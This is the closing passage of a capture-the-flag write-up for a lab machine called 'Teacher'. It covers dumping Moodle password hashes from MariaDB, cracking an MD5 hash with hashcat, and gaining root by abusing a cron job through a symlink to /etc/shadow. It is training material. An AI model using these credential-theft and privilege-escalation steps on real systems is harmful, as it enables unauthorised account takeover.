</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251108000957.png" src="img/pasted-image-20251108000957.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251108000957.png" src="img/pasted-image-20251108000957.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin the system enumeration, <code>config.php</code> files, which commonly contain passwords, were searched using the command shown in the image. A further search was performed, filtering for specific keywords to extract passwords. Finally, a <code>database</code> password was obtained, which will be used to enumerate the local <code>database</code>.</p></div><div class="el-h2"><h2 data-heading="TCP Port 3306: MariaDB Enumeration – Hashed Passwords Discovered" dir="auto" class="heading" id="TCP_Port_3306_MariaDB_Enumeration_–_Hashed_Passwords_Discovered_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 3306: MariaDB Enumeration – Hashed Passwords Discovered</h2></div><div class="el-pre"><pre class="language-mysql"><code data-line="0" class="language-mysql is-loaded">show databases;
use moodle;
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107172257.png" src="img/pasted-image-20251107172257.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107172257.png" src="img/pasted-image-20251107172257.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the databases were listed, one named <code>moodle</code> was found. This database was selected to begin the enumeration:</p></div><div class="el-pre"><pre class="language-mysql"><code data-line="0" class="language-mysql is-loaded">show tables;
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107172319.png" src="img/pasted-image-20251107172319.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107172319.png" src="img/pasted-image-20251107172319.png" target="_self"></span><br>
<span alt="Pasted image 20251107172342.png" src="img/pasted-image-20251107172342.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107172342.png" src="img/pasted-image-20251107172342.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">All the tables in the database were listed, and three: <code>mdl_user</code>, <code>mdl_user_password_history</code>, and <code>mdl_user_password_resets</code>, drew attention. First, the <code>mdl_user</code> table will be enumerated:</p></div><div class="el-pre"><pre class="language-mysql"><code data-line="0" class="language-mysql is-loaded">select * from mdl_user;
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107174041.png" src="img/pasted-image-20251107174041.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107174041.png" src="img/pasted-image-20251107174041.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The table showed four hashed passwords. The hash type appears to be <code>bcrypt</code>, but the last one, for the user <code>giovannibak</code>, seems to be <code>MD5</code>. This hash will be cracked using <code>Hashcat</code>:</p></div><div class="el-h2"><h2 data-heading="Cracking MD5 Hash Using `hashcat`" dir="auto" class="heading" id="Cracking_MD5_Hash_Using_`hashcat`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Cracking MD5 Hash Using <code>hashcat</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">hashcat <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token builtin class-name">hash</span> /home/krmena/rockyoudir/rockyou.txt <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">--force</span> <span class="token parameter variable">-o</span> pass.txt <span class="token operator">&amp;&gt;</span>/dev/null
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107175021.png" src="img/pasted-image-20251107175021.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107175021.png" src="img/pasted-image-20251107175021.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The hash was successfully cracked, revealing the clear-text password <code>expelled</code>. This will be used to gain access as the user <code>giovanni</code>:</p></div><div class="el-h2"><h2 data-heading="User Pivoting: ``www-data`` -> `giovanni`" dir="auto" class="heading" id="User_Pivoting_``www-data``_->_`giovanni`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Pivoting: <code>www-data</code> -&gt; <code>giovanni</code></h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107175047.png" src="img/pasted-image-20251107175047.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107175047.png" src="img/pasted-image-20251107175047.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The password worked, and the <code>giovanni</code> session was obtained. The user flag will then be displayed:</p></div><div class="el-h2"><h2 data-heading="User Flag" dir="auto" class="heading" id="User_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251108001804.png" src="img/pasted-image-20251108001804.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251108001804.png" src="img/pasted-image-20251108001804.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the user flag was successfully displayed, a manual <code>Bash</code> script was created to enumerate common system processes:</p></div><div class="el-h2"><h2 data-heading="Monitoring System Processes Using a Manual Bash Script" dir="auto" class="heading" id="Monitoring_System_Processes_Using_a_Manual_Bash_Script_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Monitoring System Processes Using a Manual Bash Script</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token shebang important">#!/bin/bash</span>

<span class="token assign-left variable">old_process</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> <span class="token parameter variable">-eo</span> <span class="token builtin class-name">command</span><span class="token variable">)</span></span>

<span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token assign-left variable">new_process</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> <span class="token parameter variable">-eo</span> <span class="token builtin class-name">command</span><span class="token variable">)</span></span>
        <span class="token function">diff</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$old_process</span>"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$new_process</span>"</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"[\&gt;\&lt;]"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-vE</span> <span class="token string">"command|procmon|kworker"</span>
        <span class="token assign-left variable">old_process</span><span class="token operator">=</span><span class="token variable">$new_process</span>
<span class="token keyword">done</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107175252.png" src="img/pasted-image-20251107175252.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107175252.png" src="img/pasted-image-20251107175252.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">A strange system process was discovered. It is a <code>cron job</code> that executes a script located at <code>/usr/bin/backup.sh</code>. Next, the content of this script will be displayed to determine how it can be leveraged to escalate privileges:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107175317.png" src="img/pasted-image-20251107175317.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107175317.png" src="img/pasted-image-20251107175317.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">As shown in the image, the script compresses all the content of a <code>courses/</code> directory located in <code>/home/giovanni/work</code> and then decompresses it into <code>/home/giovanni/work/tmp</code>. Finally, it grants <code>777</code> permissions to all the content. This is vulnerable because a <code>symbolic link</code> can be created to point to the <code>/etc/shadow</code> file, allowing the attacker to manipulate the <code>root</code> password hash and gain access using a known password.</p></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="Abusing Cron Job" dir="auto" class="heading" id="Abusing_Cron_Job_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Abusing Cron Job</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/shadows /home/giovanni/work/tmp
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107183822.png" src="img/pasted-image-20251107183822.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107183822.png" src="img/pasted-image-20251107183822.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To perform the exploitation, the <code>tmp</code> path was deleted to allow the creation of a <code>symbolic link</code> using the same name. Then, when the <code>cron job</code> was executed, the <code>symbolic link</code> pointed to the <code>/etc/shadow</code> file, which was edited. The password <code>hash</code> of the user <code>giovanni</code> was copied and used to replace the root user’s <code>hash</code>. This works because the password of the user <code>giovanni</code> is already known; by assigning the same <code>hash</code> to the <code>root</code> user, the root account will use the same password as <code>giovanni</code>. Finally, this password will be used to access the <code>root</code> session.</p></div><div class="el-h2"><h2 data-heading="Root Flag" dir="auto" class="heading" id="Root_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Root Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107183843.png" src="img/pasted-image-20251107183843.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107183843.png" src="img/pasted-image-20251107183843.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the target machine was successfully pwned!!</p></div><div class="el-h1"><h1 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h1></div><div class="el-p"><p dir="auto"><strong>Penelope shell handler</strong> -&gt; <a data-tooltip-position="top" aria-label="https://github.com/brightio/penelope" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/brightio/penelope" target="_self">Link</a><br>
<strong>Moodle scanner</strong> -&gt; <a data-tooltip-position="top" aria-label="https://github.com/inc0d3/moodlescan" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/inc0d3/moodlescan" target="_self">Link</a><br>
<strong>Code Injection in Moodle</strong> -&gt; <a data-tooltip-position="top" aria-label="https://www.sonarsource.com/blog/moodle-remote-code-execution/" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.sonarsource.com/blog/moodle-remote-code-execution/" target="_self">Link</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-teacher.html#Machine_Teacher_0" data-path="#Machine_Teacher_0"><div class="tree-item-inner heading-link" heading-name="Machine Teacher">Machine Teacher</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-teacher.html#Information_Gathering_0" data-path="#Information_Gathering_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Information Gathering">Information Gathering</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Discovering_OS_via_TTL_Using_`ping`_0" data-path="#Discovering_OS_via_TTL_Using_`ping`_0"><div class="tree-item-inner heading-link" heading-name="Discovering OS via TTL Using `ping`">Discovering OS via TTL Using <code>ping</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#UDP_Port_Scan_Using_`nmap`_0" data-path="#UDP_Port_Scan_Using_`nmap`_0"><div class="tree-item-inner heading-link" heading-name="UDP Port Scan Using `nmap`">UDP Port Scan Using <code>nmap</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0" data-path="#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)">TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0" data-path="#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><div class="tree-item-inner heading-link" heading-name="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)">Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0" data-path="#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><div class="tree-item-inner heading-link" heading-name="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)">Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0" data-path="#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`">TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Source_Code_Inspection_0" data-path="#TCP_Port_80_Source_Code_Inspection_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Source Code Inspection">TCP Port 80: Source Code Inspection</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0" data-path="#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Discovering Routes and Resources Using `dirsearch`">TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Virtual_Hosting_0" data-path="#Virtual_Hosting_0"><div class="tree-item-inner heading-link" heading-name="Virtual Hosting">Virtual Hosting</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Login_Attempt_Using_Common_Credentials_(Failed)_0" data-path="#TCP_Port_80_Login_Attempt_Using_Common_Credentials_(Failed)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Login Attempt Using Common Credentials (Failed)">TCP Port 80: Login Attempt Using Common Credentials (Failed)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Moodle_Version_Discovery_Using_`moodlescan`_0" data-path="#TCP_Port_80_Moodle_Version_Discovery_Using_`moodlescan`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Moodle Version Discovery Using `moodlescan`">TCP Port 80: Moodle Version Discovery Using <code>moodlescan</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Identifying_Vulnerabilities_in_Moodle_v3.4.1_Using_`searchsploit`_0" data-path="#TCP_Port_80_Identifying_Vulnerabilities_in_Moodle_v3.4.1_Using_`searchsploit`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Identifying Vulnerabilities in Moodle v3.4.1 Using `searchsploit`">TCP Port 80: Identifying Vulnerabilities in Moodle v3.4.1 Using <code>searchsploit</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Information_Leakage_on_`teacher.htb/images`_Path_–_Partial_Password_Discovered_0" data-path="#TCP_Port_80_Information_Leakage_on_`teacher.htb/images`_Path_–_Partial_Password_Discovered_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Information Leakage on `teacher.htb/images` Path – Partial Password Discovered">TCP Port 80: Information Leakage on <code>teacher.htb/images</code> Path – Partial Password Discovered</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-teacher.html#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Web_Fuzzing_to_Discover_the_Last_Character_of_a_Teacher-Role_User’s_Moodle_Password_Using_`wfuzz`_0" data-path="#TCP_Port_80_Web_Fuzzing_to_Discover_the_Last_Character_of_a_Teacher-Role_User’s_Moodle_Password_Using_`wfuzz`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Web Fuzzing to Discover the Last Character of a Teacher-Role User’s Moodle Password Using `wfuzz`">TCP Port 80: Web Fuzzing to Discover the Last Character of a Teacher-Role User’s Moodle Password Using <code>wfuzz</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Moodle_v3.4.1_Exploitation_–_Remote_Command_Execution_via_Automated_Exploit_0" data-path="#TCP_Port_80_Moodle_v3.4.1_Exploitation_–_Remote_Command_Execution_via_Automated_Exploit_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Moodle v3.4.1 Exploitation – Remote Command Execution via Automated Exploit">TCP Port 80: Moodle v3.4.1 Exploitation – Remote Command Execution via Automated Exploit</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_80_Manual_Alternative_Moodle_v3.4.1_Exploitation_Method_–_Code_Injection_(Abusing_Math_Formulas_in_the_Quiz_Component)_0" data-path="#TCP_Port_80_Manual_Alternative_Moodle_v3.4.1_Exploitation_Method_–_Code_Injection_(Abusing_Math_Formulas_in_the_Quiz_Component)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Manual Alternative Moodle v3.4.1 Exploitation Method – Code Injection (Abusing Math Formulas in the Quiz Component)">TCP Port 80: Manual Alternative Moodle v3.4.1 Exploitation Method – Code Injection (Abusing Math Formulas in the Quiz Component)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Initial_Access_0" data-path="#Initial_Access_0"><div class="tree-item-inner heading-link" heading-name="Initial Access">Initial Access</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-teacher.html#Post-Exploitation_0" data-path="#Post-Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation">Post-Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Information_Leakage_in_`config.php`_File_–_Database_Password_Discovered_0" data-path="#Information_Leakage_in_`config.php`_File_–_Database_Password_Discovered_0"><div class="tree-item-inner heading-link" heading-name="Information Leakage in `config.php` File – Database Password Discovered">Information Leakage in <code>config.php</code> File – Database Password Discovered</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#TCP_Port_3306_MariaDB_Enumeration_–_Hashed_Passwords_Discovered_0" data-path="#TCP_Port_3306_MariaDB_Enumeration_–_Hashed_Passwords_Discovered_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 3306: MariaDB Enumeration – Hashed Passwords Discovered">TCP Port 3306: MariaDB Enumeration – Hashed Passwords Discovered</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Cracking_MD5_Hash_Using_`hashcat`_0" data-path="#Cracking_MD5_Hash_Using_`hashcat`_0"><div class="tree-item-inner heading-link" heading-name="Cracking MD5 Hash Using `hashcat`">Cracking MD5 Hash Using <code>hashcat</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#User_Pivoting_``www-data``_->_`giovanni`_0" data-path="#User_Pivoting_``www-data``_->_`giovanni`_0"><div class="tree-item-inner heading-link" heading-name="User Pivoting: ``www-data`` -> `giovanni`">User Pivoting: <code>www-data</code> -&gt; <code>giovanni</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#User_Flag_0" data-path="#User_Flag_0"><div class="tree-item-inner heading-link" heading-name="User Flag">User Flag</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Monitoring_System_Processes_Using_a_Manual_Bash_Script_0" data-path="#Monitoring_System_Processes_Using_a_Manual_Bash_Script_0"><div class="tree-item-inner heading-link" heading-name="Monitoring System Processes Using a Manual Bash Script">Monitoring System Processes Using a Manual Bash Script</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-teacher.html#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-teacher.html#Abusing_Cron_Job_0" data-path="#Abusing_Cron_Job_0"><div class="tree-item-inner heading-link" heading-name="Abusing Cron Job">Abusing Cron Job</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-teacher.html#Root_Flag_0" data-path="#Root_Flag_0"><div class="tree-item-inner heading-link" heading-name="Root Flag">Root Flag</div></a><div 